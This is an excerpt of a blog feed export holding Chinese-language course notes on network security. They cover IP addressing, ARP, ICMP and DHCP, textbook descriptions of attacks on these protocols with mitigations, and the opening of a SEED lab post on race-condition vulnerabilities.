<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230208114117990.png" alt="image-20230208114117990"></p>
<p>邮件跟踪</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230208114343447.png" alt="image-20230208114343447" style="zoom:67%;" /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230208114512927.png" alt="image-20230208114512927" style="zoom:67%;" /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230208114851347.png" alt="image-20230208114851347" style="zoom:67%;" /></p>
<h2 id="一般电子邮件对策"><a href="#一般电子邮件对策" class="headerlink" title="一般电子邮件对策"></a>一般电子邮件对策</h2><p>1.加密和验证技术</p>
<p>PGP绝对私密协议：PGP允许用户产生一个签名并加密的电子邮件消息，这样接受方是秘密的，并直到发送者的密钥，发送者也是秘密的，只有知道接受方密钥的用户才能阅读消息</p>
<p>2.电子邮件过滤</p>
<p>基于IP地址</p>
<p>基于域名</p>
<p>基于附件</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230208155255617.png" alt="image-20230208155255617" style="zoom:67%;" /></p>
<p>3.内容过滤处理</p>
<p>4.电子邮件取证</p>
<p>transductive</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Network Security(三)</title>
    <url>/2023/01/29/network3/</url>
    <content><![CDATA[<h2 id="Network-Security"><a href="#Network-Security" class="headerlink" title="Network Security"></a>Network Security</h2><h3 id="网络层协议"><a href="#网络层协议" class="headerlink" title="网络层协议"></a>网络层协议</h3><p>分类</p>
<p>1.网络访问协议网络(network access protocol network)：端到端的网络，由一个单独的机构维护的封闭网络，基于电话网络</p>
<p>2.网际协议(internetwork protocol):一起工作的分布式网络</p>
<h3 id="1-地址"><a href="#1-地址" class="headerlink" title="1.地址"></a>1.地址</h3><h4 id="1-1-IP-地址"><a href="#1-1-IP-地址" class="headerlink" title="1.1 IP 地址"></a>1.1 IP 地址</h4><ul>
<li><p>全球唯一</p>
</li>
<li><p>网络地址+主机地址</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230131173645340.png" alt="image-20230131173645340"></p>
<p>点分16进制写法，一共是32位</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230131173826332.png" alt="image-20230131173826332"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230131173942062.png" alt="image-20230131173942062"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230131174034585.png" alt="image-20230131174034585"></p>
<h5 id="特殊IP地址"><a href="#特殊IP地址" class="headerlink" title="特殊IP地址"></a>特殊IP地址</h5><h6 id="网络地址"><a href="#网络地址" class="headerlink" title="网络地址"></a>网络地址</h6><p>因特网上的每个网络都有一个IP地址，其主机号部分为“0”。</p>
<p>网络地址的一般表达式为：</p>
<p>{<Network-number>，<Host-number>}={<Network-number>，0}</p>
<p>该地址用于标识网络，不能分配给主机，因此不能作为数据的源地址和目的地址</p>
<h6 id="直接广播地址"><a href="#直接广播地址" class="headerlink" title="直接广播地址"></a>直接广播地址</h6><p>直接广播（Direct Broadcast Address）：向某个网络上所有的主机发送报文。TCP/IP规定，主机号各位全部为“1”的IP地址用于广播，叫作广播地址。路由器在目标网络处将IP直接广播地址映射为物理网络的广播地址，以太网的广播地址为6个字节的全“1”二进制位，即：ff:ff:ff:ff:ff:ff 。</p>
<p>直接广播地址的一般表达式为：</p>
<p>{<Network-number>，<Host-number>}={<Network-number>, -1}</p>
<p>这里的“-1”表示全“1”。 </p>
<p>直接广播地址只能作为目的地址</p>
<h6 id="受限广播地址"><a href="#受限广播地址" class="headerlink" title="受限广播地址"></a>受限广播地址</h6><p>直接广播要求发送方必须知道信宿网络的网络号。但有些主机在启动时，往往并不知道本网络的网络号，这时候如果想要向本网络广播，只能采用受限广播地址（Limited Broadcast Address）。</p>
<p>受限广播地址是在本网络内部进行广播的一种广播地址。TCP/IP规定，32比特全为“1”的IP地址用于本网络内的广播。</p>
<p>受限广播地址的一般表达式为：</p>
<p>{<Network-number>，<Host-umber>}={-1, -1}</p>
<p>其点分十进制表示为：255.255.255.255。</p>
<p>受限广播地址只能作为目的地址。</p>
<p>路由器隔离受限广播，不对受限广播分组进行转发。也就是说因特网不支持全网络范围的广播。</p>
<h6 id="本网络地址"><a href="#本网络地址" class="headerlink" title="本网络地址"></a>本网络地址</h6><p>TCP/IP协议规定，网络号各位全部为“0”时表示的是本网络。本网络地址分为两种情况：本网络特定主机地址和本网络本主机地址。</p>
<p>本网络特定主机地址的一般表达式为：</p>
<p>{<Network-number>,<Host-number>}={0, <Host-number>}</p>
<p>本网络特定主机地址只能作为源地址。</p>
<p>本网络本主机地址的一般表达式为：</p>
<p>{<Network-number>，<Host-number>}={0, 0}</p>
<p>本网络本主机地址的点分十进制表示为：0.0.0.0。</p>
<p>本网络本主机地址只能作为源地址。</p>
<p>无盘工作站启动时没有IP地址，此时采用网络号和主机号都为“0”的本网络本主机地址作为源地址。</p>
<h6 id="环回地址"><a href="#环回地址" class="headerlink" title="环回地址"></a>环回地址</h6><p>环回地址（Loopback Address）是用于网络软件测试以及本机进程之间通信的特殊地址。 </p>
<p>A类网络地址127.X.X.X被用作环回地址。</p>
<p>环回地址的一般表达式为：</p>
<p>{<Network-number>,<Host-number>}={127, <any>}</p>
<p>习惯上采用127.0.0.1作为环回地址，命名为localhost。</p>
<p>当使用环回地址作为目标地址发送数据时，数据将不会被发送到网络上，而是在数据离开网络层时将其回送给本机的有关进程。</p>
<h4 id="1-2-路由"><a href="#1-2-路由" class="headerlink" title="1.2 路由"></a>1.2 路由</h4><p>所有的主机和网关都存储着路由表，</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230201114511493.png" alt="image-20230201114511493"></p>
<p>这里举例H1想把数据包发送给H2，那么目的地址位192.168.1.25，使用掩码后也就是从本机的端口发送，匹配H1路由表的第一条，那么如何找到H2的硬件地址，需要ARP(Address Resolution Protocol)协议，也就是地址解析协议，这个协议会发送广播数据包到网络上的所有设备，去查询本地网络上的所有设备是否有请求的IP地址，当设备收到ARP请求时，会检查请求的IP地址，如果地址匹配，那么就用它的硬件地址进行回复。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230201115301690.png" alt="image-20230201115301690"></p>
<h4 id="1-3-数据包格式"><a href="#1-3-数据包格式" class="headerlink" title="1.3 数据包格式"></a>1.3 数据包格式</h4><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230201120314043.png" alt="image-20230201120314043"></p>
<ul>
<li>VER版本号（4比特）：IP协议的版本号，值为4或者6</li>
<li>IHL头部长度（4bit）：这是4个字节表示的IP头部的长度，默认值为5</li>
<li>TYPE服务类型（8bit）：设置这个字段是用来标记各个类型服务等级的网络，通常使用0</li>
<li>总长度（16比特）：这个字段用来表示首部长度和数据之和，单位为字节，通常总长度16位，</li>
<li>所以数据报的最大长度为 $2^{16}-1=65 535$字节.在IP层下面的每一种数据链路层都有自己的帧格式,其中包括帧格式中的数据字段的最大长度,即最大传送单元 MTU (Maximum Transfer Unit).当一个数据报封装成链路层的帧时,此数据报的总长度 (即首部加上数据部分)一定不能超过下面的数据链路层的MTU值,否则要分片.</li>
<li>ID(16bit):这个字段包含一个识别标志ID，用于唯一识别由设备发送的每一个数据包，这个字段支持拆分和重组，相同的标识字段的值使分片后的各</li>
<li>Flag(标志)3bit：第一位保留并设置为0，第二位是不拆分D标志DF，1表示不分片，0表示分片；最低位MF，1表示后面还有分片，0表示后面没有分片</li>
<li>offset片偏移（13bit）：单位8字节，相对数据部分起点的偏移，可以知道每个分片的数据部分长度一定是8字节的整数倍</li>
<li>生存时间TTL：表示数据包在网络中的寿命，单位是跳hop，每个路由减1，直到0的时候被抛弃</li>
<li>协议8bit:运输层使用的协议，方便IP层直到应将数据包部分上交到哪一个协议栈处理</li>
<li>首部检验和：16bit，每经过一个路由器，都需要重新计算一下首部检验和，比如生存时间等首部区域的值可能变化，不检验数据部分可以减少工作量</li>
<li>源地址和目的地址都是32bit</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230201192332292.png" alt="image-20230201192332292"></p>
<h3 id="2-ARP"><a href="#2-ARP" class="headerlink" title="2.ARP"></a>2.ARP</h3><p>因为请求的设备不知道目标的硬件地址，所以它必须使用以太广播包给网络上的每一台设备发送ARP请求，当一台设备收到一个ARP请求数据包时，它用它自己的IP地址与头部的IP地址进行比较。如果匹配，如果匹配，这个设备就会给发送IP请求的设备发送一个ARP回应数据包，ARP的回应数据包并不是广播数据包.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/v2-313f6f543e1ee58083aa829150887177_b.jpg" alt="img"></p>
<ul>
<li>硬件类型16：ARP协议起作用的物理网络类型，以太网协议的值为1</li>
<li>协议类型16：表示三层协议地址类型，一般为ip值为0x800</li>
<li>硬件长度8：在头部硬件地址段以字节表示的长度，以太网协议使用的6</li>
<li>协议长度：上层协议地址的长度，IPV4的值是4</li>
<li>运算16：该字段指出是请求数据包1，还是回应数据包2</li>
<li>发送方硬件地址</li>
<li>发送方协议地址，也就是发送方的IP地址</li>
<li>目的硬件地址，当ARP请求的时候这个字段全是0</li>
<li>目标协议地址：可变的也就是目标IP地址</li>
</ul>
<p>ARP的一个攻击是使用ARP回应来戏弄发送者，使他把数据包发送到错误的地址方向，这就称为ARP欺骗，或者ARP缓冲区中毒</p>
<h3 id="3-ICMP"><a href="#3-ICMP" class="headerlink" title="3.ICMP"></a>3.ICMP</h3><p>ICMP用于对运行的Ip的设备的询问，并报告在IP数据包寻径和递交时出错的报告。ICMP数据包是IP协议的组成部分，它起到辅助IP的作用。ICMP数据包是作为载荷携带在IP数据包中的，从这个角度来讲，ICMP看起来是上层协议。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202101312672.png" alt="image-20230202101312672"></p>
<p>类型代码 类型描述</p>
<p>0 响应应答（ECHO-REPLY）</p>
<p>3 不可到达</p>
<p>4 源抑制</p>
<p>5 重定向</p>
<p>8 响应请求（ECHO-REQUEST）</p>
<p>11 超时</p>
<p>12 参数失灵</p>
<p>13 时间戳请求</p>
<p>14 时间戳应答</p>
<p>15 信息请求（*已作废）</p>
<p>16 信息应答（*已作废）</p>
<p>17 地址掩码请求</p>
<p>18 地址掩码应答</p>
<p>下面是几种常见的ICMP报文：</p>
<p>1.响应请求</p>
<p>我们日常使用最多的ping，就是响应请求（Type=8）和应答（Type=0），一台主机向一个节点发送一个Type=8的ICMP报文，如果途中没有异常（例如被路由器丢弃、目标不回应ICMP或传输失败），则目标返回Type=0的ICMP报文，说明这台主机存在，更详细的tracert通过计算ICMP报文通过的节点来确定主机与目标之间的网络距离。</p>
<p>2.ICMP目标不可达</p>
<p>目标不可到达报文（Type=3）在路由器或主机不能传递数据报时使用，例如我们要连接对方一个不存在的系统端口（端口号小于1024）时，将返回Type=3、Code=3的ICMP报文，，常见的不可到达类型还有网络不可到达（Code=0）、主机不可到达（Code=1）、协议不可到达（Code=2）等。</p>
<p>3.ICMP时间戳请求</p>
<p>时间戳请求报文（Type=13）和时间戳应答报文（Type=14）用于测试两台主机之间数据报来回一次的传输时间。传输时，主机填充原始时间戳，接收方收到请求后填充接收时间戳后以Type=14的报文格式返回，发送方计算这个时间差。一些系统不响应这种报文。</p>
<p>4.ICMP超时 11</p>
<p>如果编码字段为0，则超时信息表明存活时间减少到了0，且数据包被删除了，如果编码字段是1，则数据包被拆分了但接收设备在时钟过期后没有接收到所有片段。源抑制则充当一个控制流量的角色，它通知主机减少数据报流量，由于ICMP没有恢复传输的报文，所以只要停止该报文，主机就会逐渐恢复传输速率。最后，无连接方式网络的问题就是数据报会丢失，或者长时间在网络游荡而找不到目标，或者拥塞导致主机在规定时间内无法重组数据报分段，这时就要触发ICMP超时报文的产生。超时报文的代码域有两种取值：Code=0表示传输超时，Code=1表示重组分段超时。</p>
<p>5.ICMP重定向 5</p>
<p>路由器使用重定向消息告知本地同一网络中的主机，有到达目标的更好路由存在，</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213436681.png" alt="image-20230202213436681"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213353330.png" alt="image-20230202213353330"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213536553.png" alt="image-20230202213536553"></p>
<p>ARP请求是封装在以太网帧中的，因此并没有IP地址的描述</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213845504.png" alt="image-20230202213845504"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213905508.png" alt="image-20230202213905508"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213915004.png" alt="image-20230202213915004"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213925123.png" alt="image-20230202213925123"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213934859.png" alt="image-20230202213934859"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213943620.png" alt="image-20230202213943620"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202213952258.png" alt="image-20230202213952258"></p>
<p>这里H1的局域网中并没有H6这个主机，因此H1发送了几次ARP请求后，H1不再尝试，且表明主机H6是不可达的，这个通知发送到试图发送这个数据包的应用中，大部分应用收到这个通知后，停止发送这个数据包</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202214648875.png" alt="image-20230202214648875"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202215052097.png" alt="image-20230202215052097"></p>
<p>​    如图6.19所示，主机HI以H7为目标地址，以主机H1的IP地址为源地址,封装一个ICMP回应请求(假定主机H7的地址在网络2中，但并没有地址是H7的设备)。主机H1查找它的路由表,发现下一跳是路由器R1(默认路由)。主机HI检查它的ARP表，从表中得到路由器Rl的硬件地址。主机H1将路由器RI的硬件地址设为ICMP回应数据包的目标地址，并且将这个数据包发送到路由器R1(数据包1)。</p>
<p>​    路由器Rl收到这个ICMP回应请求数据包，根据目标IP地址确定这个数据包不是发往路由器Rl的，因此应该将这个数据包路由到其他地方。路由器R1将存活时间字段减小，并判断数据包是否已经达到它的最大跳数。假定存活时间没有过期,路由器RI检查它的路由表，确定要将数据包发往何处。路由表表明主机H7直接连接在网络2中，路由器RI可以使用接口2访问网络2。路由器R1检查它接口2的ARP表，确定它需要向网络2中的主机发送一个ARP请求(数据包2)，询问主机H7的硬件地址。当路由器RI没有收到对这个ARP请求的回应时(经过一段时间)，路由器R1重新尝试传递这个ARP请求。经过几次重试(数据包2和数据包3),路由器R1表明主机H7是不可达的。</p>
<p>​    路由器RI可以创建一个ICMP目标不可达的数据包，并将其发送回主机H1(数据包4)。并不是所有路由器都配置有返回ICMP目标不可达数据包，在这种情况下发送者可能不停地发送数据包。如果主机H收到一个ICMP目标不可达数据包，应用通常停止发送数据包。</p>
<p>​    在这个场景中，我们看到单一的ICMP回应数据包和ICMP目标不可达数据包在网络1中传递。我们看到在路由器Rl确定主机H7不存在前，有4个ARP请求数据包在网络2中传递。从安全角度来讲，这个问题和场景5一样，不一样的是引起ARP请求数据包产生的设备(主机H1 )是在一个不同的网络中。这个场景表明，一个远程计算机能够向一个网络发送数据包，并且引起多个广播的产生。由于路由的ARP表从未填充，因此每一个来自外界的请求都将产生一个ARP请求。</p>
<p>​    当多个攻击者向一个网络中多个不存在的主机发送数据包时，这确实能成为一个问题。比如，如果一个攻击者使用公开地址遍扫一个网络中少量主机地址，则将产生数量巨大的ARP请求数据包。如果多个攻击者瞄向同一个网络,结果可能是一个网络中的ARP雪崩。</p>
<h3 id="4-基于头部的攻击"><a href="#4-基于头部的攻击" class="headerlink" title="4.基于头部的攻击"></a>4.基于头部的攻击</h3><p>​    从安全角度来讲，可以将IP头部字段分成两类。第一类(端点字段)主要由端点使用的端点字段构成，端点字段在传递过程中是不进行检测的。第二类(传递字段)主要由各个路由器进行检测，并且在传递过程中可能被修改的字段构成。端点字段包括长度、标识.标志、偏移、协议和源P地址。即使路由器能够改变长度、标志和偏移值字段的值,如果数据包需要拆分，它们也被认为是端点字段。因为大多数攻击使用这些字段瞄向端点。对传递字段的攻击经常引起路由器对数据包的丢弃。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202220307276.png" alt="image-20230202220307276"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202220430515.png" alt="image-20230202220430515"></p>
<p>traceroute还可以用于图形网络管理工具，cheops-ng工作在网络环境中的底层，它会拦截所有正在网络上传送的数据，通过借助相应的软件进行处理。嗅探器可以实时分析这些数据的内容，进而可以帮助网络管理员分析整个网络的状态、性能或故障。正因如此，在检测、管理Linux网络故障时，cheops-ng对管理员来说是一种不可或缺的强力工具。</p>
<p>很少的基于ARP和ICMP头部的攻击</p>
<h3 id="5-基于协议的攻击"><a href="#5-基于协议的攻击" class="headerlink" title="5.基于协议的攻击"></a>5.基于协议的攻击</h3><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230202221828891.png" alt="image-20230202221828891"></p>
<p>大多数针对IP和ICMP的攻击瞄向数据包的路由，并且设法引起数据包错误路由，路由表</p>
<p>路由跟踪程序可看作一种针对协议的攻击，traceroute，因为使用ttl来确定路径是不好减灾的</p>
<p>有些攻击中，是通过嗅探和伪造，使用错误信息引起服务拒绝或者将流量定位到错误的地方</p>
<p>还有ARP的相关攻击</p>
<h3 id="6-基于认证的攻击"><a href="#6-基于认证的攻击" class="headerlink" title="6.基于认证的攻击"></a>6.基于认证的攻击</h3><p>IP地址欺骗：创建一个src IP地址与自身IP地址不同的数据包</p>
<ul>
<li>从一个攻击者或者多个攻击者发送多个请求，或者直接发送广播数据包</li>
<li>减灾：<font color='blue'>设置路由器不允许内部转发，或者不允许某些ICMP协议从外部进入进行减灾</font></li>
</ul>
<p>还有一种攻击是会话欺骗攻击：通过同时对路由表或者ARP缓存进行攻击，让回送数据包到达攻击者主机上</p>
<h3 id="7-基于流量的攻击"><a href="#7-基于流量的攻击" class="headerlink" title="7.基于流量的攻击"></a>7.基于流量的攻击</h3><h4 id="1-IP协议"><a href="#1-IP协议" class="headerlink" title="1.IP协议"></a>1.IP协议</h4><p>嗅探：对数据包的嗅探最常见的地方是在无线网络中</p>
<p>消除方法：IP载荷加密</p>
<p>雪崩：</p>
<p>1.发送远程IP数据广播包，攻击者向远程的网络发送一个广播包并请求应答，减灾：禁止广播</p>
<h4 id="2-ARP协议"><a href="#2-ARP协议" class="headerlink" title="2.ARP协议"></a>2.ARP协议</h4><p>另一种雪崩式ARP协议，攻击者远程制造一个ARP广播雪崩</p>
<h3 id="8-BOOTP-DHCP"><a href="#8-BOOTP-DHCP" class="headerlink" title="8.BOOTP/DHCP"></a>8.BOOTP/DHCP</h3><h4 id="8-1BOOTP"><a href="#8-1BOOTP" class="headerlink" title="8.1BOOTP"></a>8.1BOOTP</h4><p>有两种分配IP地址的方式，第一种是静态的，一般是手工分配地址和网络掩码，第二种方法是动态的，这种情况下一般使用DHCP动态分配IP地址</p>
<p>BOOTP基于请求设备的硬件地址，它每次将同一个IP地址分配给同一台设备。BOOTP协议要求有一个BOOTP服务器，有一个配置表，对应硬件地址和IP地址。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207100241762.png" alt="image-20230207100241762"></p>
<p>这里首先客户端IP设置为0.0.0.0本机IP，然后发送一个广播包，在67号端口运行BOOTP程序的服务器将接受这个数据包，并发送回复，目的硬件地址是客户端的硬件地址，这里是因为客户端主机还没有IP地址，BOOTP载荷将封装在UDP中</p>
<p>可以使用BOOTP中继</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207100749602.png" alt="image-20230207100749602"></p>
<p>这里BOOTP中继起到了数据包转发的功能</p>
<h4 id="8-2-DHCP"><a href="#8-2-DHCP" class="headerlink" title="8.2 DHCP"></a>8.2 DHCP</h4><p>BOOTP协议的IP地址和硬件地址之间的映射是静态的，仍然要求管理员配置服务器</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207101008035.png" alt="image-20230207101008035"></p>
<p>静态池和BOOTP一样的运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207101038507.png" alt="image-20230207101038507"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207101331420.png" alt="image-20230207101331420"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207101343461.png" alt="image-20230207101343461"></p>
<h4 id="8-3-基于头部的攻击"><a href="#8-3-基于头部的攻击" class="headerlink" title="8.3 基于头部的攻击"></a>8.3 基于头部的攻击</h4><p>UDP载荷运载，头部设计的很简单，没有基于头部的攻击</p>
<h4 id="8-4基于协议的攻击"><a href="#8-4基于协议的攻击" class="headerlink" title="8.4基于协议的攻击"></a>8.4基于协议的攻击</h4><p>1.BOOTP</p>
<font color='blue'>攻击者假装成BOOTP服务器向攻击者发送虚假的信息，最好归于基于验证的攻击</font>

<p>2.DHCP</p>
<p>1.<font color='red'>DHCP Starvation attack</font> 攻击者使用多个虚拟的硬件地址来发送大量的DHCP查找数据包，其目的是消耗掉动态池中所有的IP地址，这种攻击很难进行消除，会造成服务器拒绝服务</p>
<p>2.伪装成客户端，向服务器发送一个DHCP释放数据包</p>
<ul>
<li>敌手能力：访问网络，可以选择嗅探查找数据包，这样攻击更有针对性，不然只能根据地址池尝试</li>
<li>攻击结果：网络混乱</li>
<li>适用场所：公开的无线网络</li>
<li>减灾：很难消除</li>
</ul>
<h4 id="8-5-基于验证的攻击"><a href="#8-5-基于验证的攻击" class="headerlink" title="8.5 基于验证的攻击"></a>8.5 基于验证的攻击</h4><p>BOOTP和DHCP是不进行验证的，会对任何请求进行回应</p>
<p>1.对BOOTP和静态的DHCP来说，只关注未验证客户端地址的分配问题，可以增加访问控制</p>
<p>2.一个欺骗性的DHCP服务器能够给一个客户端分配一个网络中无效的地址，攻击者需要看到来自客户端的DHCP数据包</p>
<p>增加额外的验证：需要进行密码和密钥交换，验证在一个封闭的网络中能很好工作，但在开放的无线网络中不好办</p>
<h4 id="8-6-基于流量的攻击"><a href="#8-6-基于流量的攻击" class="headerlink" title="8.6 基于流量的攻击"></a>8.6 基于流量的攻击</h4><p>非秘密信息，因此嗅探并不是一个很关键的点， 也没有很好的雪崩攻击的方式</p>
<h3 id="通用的对抗措施"><a href="#通用的对抗措施" class="headerlink" title="通用的对抗措施"></a>通用的对抗措施</h3><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207112439362.png" alt="image-20230207112439362"></p>
<p>IP过滤和网络地址转化用来保护网络不受攻击，另外两个提供端到端的数据包验证和加密</p>
<h4 id="1-IP过滤"><a href="#1-IP过滤" class="headerlink" title="1.IP过滤"></a>1.IP过滤</h4><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207112929906.png" alt="image-20230207112929906"></p>
<h4 id="2-NAT转换"><a href="#2-NAT转换" class="headerlink" title="2.NAT转换"></a>2.NAT转换</h4><p>静态NAT：外部地址和内部地址之间一一映射，没有减少所需公共地址的数量，适用于小型网络</p>
<p>动态NAT：内部地址多于公共地址，适用于大型网络</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207115226244.png" alt="image-20230207115226244"></p>
<p>使用NAT一般内部都为客户端，因此不必仔细考虑第一个外部数据包到达时的情况，NAT的一个好处时当NAT的目标地址和目标端口不在隧道表中，它可能只是丢弃这个数据包，也可能发回一个ICMP目标不可达，无论是哪一种情况，这个数据包都不会进入私有的网络中</p>
<h4 id="3-虚拟专用网VPN"><a href="#3-虚拟专用网VPN" class="headerlink" title="3.虚拟专用网VPN"></a>3.虚拟专用网VPN</h4><p>VPN用来提供通信双方的加密和验证通信信道，VPN分成三类：网络到网络、客户端到网络和客户端到客户端</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207150915366.png" alt="image-20230207150915366"></p>
<p>网络到网络和客户端到网络均有两种配置，一种是所有到主网络上的流量走VPN，所有不到主网络上的流量走互联网，另一种配置是将客户端/网络变成主网络的一部分，所有的流量都走VPN</p>
<p>VPN的好处是能够避免嗅探和验证，VPN提供对受控网络的访问</p>
<h4 id="4-IPSEC"><a href="#4-IPSEC" class="headerlink" title="4.IPSEC"></a>4.IPSEC</h4><p>IPSEC是一种为IPV6设计的支持加密和验证的协议，IPSEC一个头部支持验证，另一个头部支持加密和验证</p>
<p>验证头部是一个扩展头部，能够验证数据没有被改动</p>
<p>能够首先对数据进行哈希运算，然后再对哈希的值进行加密</p>
<p>第二个头部支持载荷加密，并且支持验证，esp头部+载荷+esp尾部+验证数据，IPSEC能够减少嗅探和验证攻击，实现的真正问题是密钥的分发，需要使用PKI公钥基础设施</p>
<h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>ARP缓存还有一个特点是，每个条目是有有效期的；一段时间之后就过期了。这也是符合直觉的。因为IP地址和MAC地址的对应关系不是一成不变的。另外就是ARP缓存是无状态的；也即，它不是一定要自己发出请求只利用回复更新自己的表，只要能收到新的ARP信息，它就很开心地更新了。【更新：若收到应答包，目的mac地址是硬件广播地址或是者本机网卡地址，无论目的IP是不是本机网卡IP，只要缓存表中已经存在对应的ARP条目，且与收到的应答条目不一致，那么就要更新该条目。若缓存表中没有存在该条目，那么则忽略该应答。】</p>
<p>【Gratuitous ARP也称为免费ARP。无故ARP。Gratuitous ARP不同于一般的ARP请求，它并不是期待得到IP相应的MAC地址，而是当主机启动的时候，将发送一个Gratuitous arp请求，即请求自己的IP地址的MAC地址。</p>
<p>免费 ARP 数据包有以下 3 个作用：</p>
<ul>
<li>该类型报文起到一个宣告作用。它以广播的形式将数据包发送出去，不需要得到回应，只为了告诉其他计算机自己的 IP 地址和 MAC 地址。</li>
<li>可用于检测 IP 地址冲突。当一台主机发送了免费 ARP 请求报文后，如果收到了 ARP 响应报文，则说明网络内已经存在使用该 IP 地址的主机。</li>
<li>可用于更新其他主机的 ARP 缓存表。如果该主机更换了网卡，而其他主机的 ARP 缓存表仍然保留着原来的 MAC 地址。这时，可以发送免费的 ARP 数据包。其他主机收到该数据包后，将更新 ARP 缓存表，将原来的 MAC 地址替换为新的 MAC 地址。</li>
</ul>
<p>P层是没有超时重传机制的。如果IP层对一个数据包进行了分片，只要有一个分片丢失了，只能依赖于传输层进行重传，结果是所有的分片都要重传一遍</p>
<p>ARP缓存中毒缓解技术<br>远程中毒ARP缓存有点困难，因为它需要物理访问网络或控制网络中的一台计算机。由于它并不总是那么容易，因此不经常听到ARP攻击。无论如何，采取预防措施总比吃药好。网络管理员应注意不要发生此类攻击。以下是一些缓解措施：</p>
<p>对于小型网络，可以维护静态ARP条目。静态意味着不变，因此，顾名思义，这些条目不能更改，因此，黑客试图更改映射的任何尝试都会失败。这适用于小型网络，但不适用于大型网络，因为添加到网络中的每个新设备的映射都需要手动完成。<br>对于大型网络，可以探索网络交换机的端口安全功能。某些功能在打开时会强制交换机为交换机上的每个物理端口仅允许一个MAC地址。此功能可确保计算机无法更改其MAC地址，并且不能将多个MAC映射到其计算机，从而防止像“中间人”这样的攻击。<br>通常，可以部署某些监视工具（如ARPwatch）来在网络上发生某些恶意ARP活动时获取警报。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network Security</tag>
      </tags>
  </entry>
  <entry>
    <title>seedlab(三)</title>
    <url>/2023/01/05/race_condition/</url>
    <content><![CDATA[<h1 id="竞争条件"><a href="#竞争条件" class="headerlink" title="竞争条件"></a>竞争条件</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>​    本实验目的是学习竞争条件漏洞的相关内容，当多个进程同时访问和操作相同的数据时，会出现竞争条件，执行的结果取决于访问发生的特定顺序。如果特权程序存在竞争条件漏洞，攻击者可以运行并行进程与特权程序“竞争”，从而改变程序的行为。</p>
<p>本实验将涵盖下面的主题：</p>
<p>1.竞争条件漏洞</p>
<p>2.粘滞符号链接保护</p>
<p>3.最小权限原则</p>
